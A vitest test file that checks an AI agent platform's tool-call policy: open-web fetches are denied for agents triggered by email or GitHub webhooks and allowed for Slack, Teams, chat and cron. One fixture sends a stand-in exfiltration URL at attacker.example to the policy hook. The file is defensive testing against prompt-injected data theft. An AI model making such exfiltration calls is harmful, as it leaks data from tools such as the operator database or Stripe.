
import { describe, it, expect } from "vitest";
import { evaluateToolCallPolicy } from "@/services/agents/tool-call-policy";
import {
  preToolUsePolicyHook,
  type PreToolUsePolicyCtx,
} from "@/services/agents/pre-tool-use-policy";
import { AGENT_TRIGGERS, type AgentTrigger } from "@/services/agents/types";
import { isUntrustedInboundTrigger } from "@/services/agents/untrusted-trigger";

function deriveUntrustedInbound(trigger: AgentTrigger): boolean {
  return isUntrustedInboundTrigger(trigger);
}

const WEB_FETCH = "web_fetch__fetch";
const SDK_WEB_FETCH = "mcp__server__web_fetch__fetch";

type Case = {
  trigger: AgentTrigger;
  agent_slug: string;
  resolved: string[];
  label: string;
};

const ARMED_CASES: Case[] = [
  {
    trigger: "email",
    agent_slug: "support-lead",
    resolved: [WEB_FETCH, "operator_db__query"],
    label: "support-lead on EMAIL (operator_db co-resident)",
  },
  {
    trigger: "webhook",
    agent_slug: "engineer",
    resolved: [WEB_FETCH, "github__get_pr_diff"],
    label: "engineer on GITHUB WEBHOOK (external PR/issue content co-resident)",
  },
];

const ACCEPTED_OPEN_CASES: Case[] = [
  {
    trigger: "slack",
    agent_slug: "support-lead",
    resolved: [WEB_FETCH, "operator_db__query"],
    label: "support-lead on SLACK (operator_db co-resident)",
  },
  {
    trigger: "slack",
    agent_slug: "operator",
    resolved: [WEB_FETCH, "stripe__list_charges"],
    label: "operator on SLACK (stripe co-resident)",
  },
  {
    trigger: "teams",
    agent_slug: "operator",
    resolved: [WEB_FETCH, "stripe__list_charges"],
    label: "operator on TEAMS (stripe co-resident)",
  },
];

function loopEgressAllowed(c: Case): boolean {
  return evaluateToolCallPolicy({
    tool_name: WEB_FETCH,
    resolved_tool_names: c.resolved,
    research_scoped: false,
    agent_slug: c.agent_slug,
    untrusted_inbound: deriveUntrustedInbound(c.trigger),
  }).allow;
}

function sdkCtx(c: Case): PreToolUsePolicyCtx {
  return {
    tenant_id: "t-canary",
    agent: { slug: c.agent_slug },
    runId: "run-canary",
    thread_id: null,
    killed: { value: false },
    iter: { value: 0 },
    resolved_tool_names: c.resolved,
    research_scoped: false,
    untrusted_inbound: deriveUntrustedInbound(c.trigger),
  };
}

async function sdkEgressAllowed(c: Case): Promise<boolean> {
  const r = await preToolUsePolicyHook({
    isAgentKilled: async () => false,
    emitThreadEvent: async () => {},
    ctx: sdkCtx(c),
    hookInput: {
      hook_event_name: "PreToolUse",
      tool_name: SDK_WEB_FETCH,
      tool_input: { url: "https://attacker.example/exfil?d=..." },
      tool_use_id: "tu-canary",
      cwd: "/tmp",
      permission_mode: "default",
      session_id: "s-canary",
      transcript_path: "/tmp/t",
    },
  });
  return r.continue === true;
}

describe("E9 canary — untrusted-inbound egress deny is armed for EMAIL + GITHUB-WEBHOOK (Slack/Teams accepted-open)", () => {
  describe("EMAIL + GITHUB-WEBHOOK — armed, must DENY open-web egress", () => {
    for (const c of ARMED_CASES) {
      it(`dispatcher loop DENIES web egress on ${c.label}`, () => {
        expect(loopEgressAllowed(c)).toBe(false);
      });
      it(`SDK default engine DENIES web egress on ${c.label}`, async () => {
        expect(await sdkEgressAllowed(c)).toBe(false);
      });
    }
  });

  describe("SLACK / TEAMS — accepted-open (Ravi's locked decision), egress ALLOWED", () => {
    for (const c of ACCEPTED_OPEN_CASES) {
      it(`dispatcher loop ALLOWS web egress on ${c.label} — ACCEPTED-OPEN (Slack/Teams stay trusted)`, () => {
        expect(loopEgressAllowed(c)).toBe(true);
      });
      it(`SDK default engine ALLOWS web egress on ${c.label} — ACCEPTED-OPEN`, async () => {
        expect(await sdkEgressAllowed(c)).toBe(true);
      });
    }
  });

  describe("CHAT / CRON — internal-origin, egress must stay OPEN (false-positive guard)", () => {
    const internalCases: Case[] = [
      {
        trigger: "chat",
        agent_slug: "operator",
        resolved: [WEB_FETCH, "stripe__list_charges"],
        label: "operator on CHAT (tenant's own authenticated user)",
      },
      {
        trigger: "cron",
        agent_slug: "support-lead",
        resolved: [WEB_FETCH, "operator_db__query"],
        label: "support-lead on CRON (scheduled, internal-origin)",
      },
    ];

    for (const c of internalCases) {
      it(`dispatcher loop ALLOWS web egress on ${c.label}`, () => {
        expect(loopEgressAllowed(c)).toBe(true);
      });
      it(`SDK default engine ALLOWS web egress on ${c.label}`, async () => {
        expect(await sdkEgressAllowed(c)).toBe(true);
      });
    }
  });

  describe("derivation table — which triggers are untrusted-inbound after E1", () => {
    const ARMED: AgentTrigger[] = ["email", "webhook"];

    it("all 12 AGENT_TRIGGERS are covered by this table (no trigger silently un-audited)", () => {
      expect(AGENT_TRIGGERS.length).toBeGreaterThanOrEqual(12);
      for (const t of ARMED) {
        expect(AGENT_TRIGGERS as readonly string[]).toContain(t);
      }
    });

    for (const t of AGENT_TRIGGERS) {
      const armed = ARMED.includes(t);
      it(`trigger "${t}": untrusted_inbound = ${armed}${
        (t === "slack" || t === "teams") ? " (accepted-open: Slack/Teams stay trusted)" : ""
      }`, () => {
        expect(deriveUntrustedInbound(t)).toBe(armed);
      });
    }
  });

  describe("kill switch — UNTRUSTED_INBOUND_TRIGGER_WIDEN=0 reverts to legacy email-only", () => {
    it("with the flag OFF, webhook is NO LONGER untrusted; email still is", () => {
      const prev = process.env.UNTRUSTED_INBOUND_TRIGGER_WIDEN;
      process.env.UNTRUSTED_INBOUND_TRIGGER_WIDEN = "0";
      try {
        expect(isUntrustedInboundTrigger("email")).toBe(true);
        expect(isUntrustedInboundTrigger("webhook")).toBe(false);
        expect(isUntrustedInboundTrigger("slack")).toBe(false);
      } finally {
        if (prev === undefined) delete process.env.UNTRUSTED_INBOUND_TRIGGER_WIDEN;
        else process.env.UNTRUSTED_INBOUND_TRIGGER_WIDEN = prev;
      }
    });
  });
});
